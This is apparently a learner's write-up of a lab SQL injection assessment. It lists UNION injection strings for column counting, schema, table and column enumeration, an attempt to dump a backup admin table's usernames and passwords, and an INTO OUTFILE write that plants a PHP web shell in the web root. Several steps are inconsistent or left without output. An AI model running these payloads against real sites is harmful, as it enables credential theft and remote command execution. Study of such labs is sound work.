# Skill Assessment

Here is the first successful injection results:

>cn' UNION select 1,2,3-- -

With the resulting output:

>Adam 	January 	1337$ 	5%
>James 	March 	1213$ 	8%

**NOTE: I didn't notice the first time through but this command puts you on a page related to payroll, which intakes different injections than the home page**

I then iterated through another UNION query to find out how many columns were in the table I am accessing:

>cn' UNION SELECT 1,2,3,4,5-- -

Once I determined there were four columns with the above injection, I used \@@version to determine the current version of the database being used:

>cn' UNION SELECT 1,\@@version,3,4,5-- -

Which returned:
 
Now that I knew the name of the database being used, I decided to determine what other databases were available with the following injection:

>cn' UNION select 1,schema_name,3,4,5 from INFORMATION_SCHEMA.SCHEMATA-- -

This returned the following:

>information_schema 	3 	4 	5

This returned the following:
 
From here I ruled out the default databases named information_schema, mysql, and performance_schema, and focused on the remaining databases named ilfreight and backup.

Now I decided to discover all the tables within the two databases of interest with the two following statements:
 
>cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4,5 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -

>cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4,5 from INFORMATION_SCHEMA.TABLES where table_schema='backup'-- -

These queries had the following output respectively:

>payment 	ilfreight 	4 	5 
>users 	ilfreight 	4 	5
>admin_bk 	backup 	4 	5

Now I determined that I would list all columns of the admin_bk and backup tables from the backup database:

>cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,5 from INFORMATION_SCHEMA.COLUMNS where table_name='admin_bk'-- -

>cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,5 from INFORMATION_SCHEMA.COLUMNS where table_name='backup'-- -

This generated the following output respectively:

>username 	admin_bk 	backup 	5
>password 	admin_bk 	backup 	5

>(no output)

Now I decided to dump data from a table in another database:

>c' UNION select 1, username, password, 4, 5 from username.backup-- -

>c' UNION select 1, username, password, 4, 5 from password.backup-- -

This returned that the targets did not exist. I decided to try again using admin_bk instead of backup:

>c' UNION select 1, username, password, 4, 5 from password.admin_bk-- -

Similar results. Clearly I have a problem with my database.table part of the query.

When I tried backup.username, this was still incorrect.
 
I then watched a bit of a youtube vid and tried to use the OUTPUT INTO function to write to the file proof.txt:

>cn' UNION SELECT 1, 'file written successfully!', 3, 4,5 INTO OUTFILE '/dashboard/var/www/html/proof.txt'-- -

This did not work because the dashboard directory should be at the end of the directory path to include proof.txt:

>cn' UNION SELECT 1, 'file written successfully!', 3, 4,5 INTO OUTFILE '/var/www/html/dashboard/proof.txt'-- -

This returned no output, suggesting that we have successfully written to the file.

I then checked by including /var/www/html/dashboard/proof.txt at the end of my working URL for the site:

>/http://94.237.58.135:59758/dashboard/proof.php

This output indicates that our file write was successful.

>cn' UNION SELECT 1, 'file written successfully!', 3, 4,5 INTO OUTFILE '/dashboard/var/www/html/dashboard/proof.txt'-- -

Then I used a modified version of the following script to write php injections into the shell.php file:

>cn' UNION SELECT "", '\<?php system($\_REQUEST\[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -

